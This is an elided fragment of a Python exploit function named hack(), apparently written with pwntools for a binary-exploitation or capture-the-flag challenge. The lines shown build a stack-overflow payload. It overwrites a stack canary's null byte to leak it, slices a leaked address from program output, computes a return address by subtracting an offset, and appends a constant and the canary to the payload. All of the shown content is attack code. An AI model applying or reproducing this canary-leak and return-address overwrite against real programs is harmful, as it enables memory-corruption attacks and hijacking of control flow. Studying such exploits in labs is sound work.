...
def hack():
    ...
    leak_canary_payload = b"REPEAT" + b"A" * 35  # overwrite the \x00 byte
    ...
    leaked_addr_partial = data[48:54]
    ...
    return_addr = p64(leaked_addr - 0x10f0)  # adjust offset as needed
    ...
    payload += p64(0xaef0cb893d3a938a)
    payload += canary
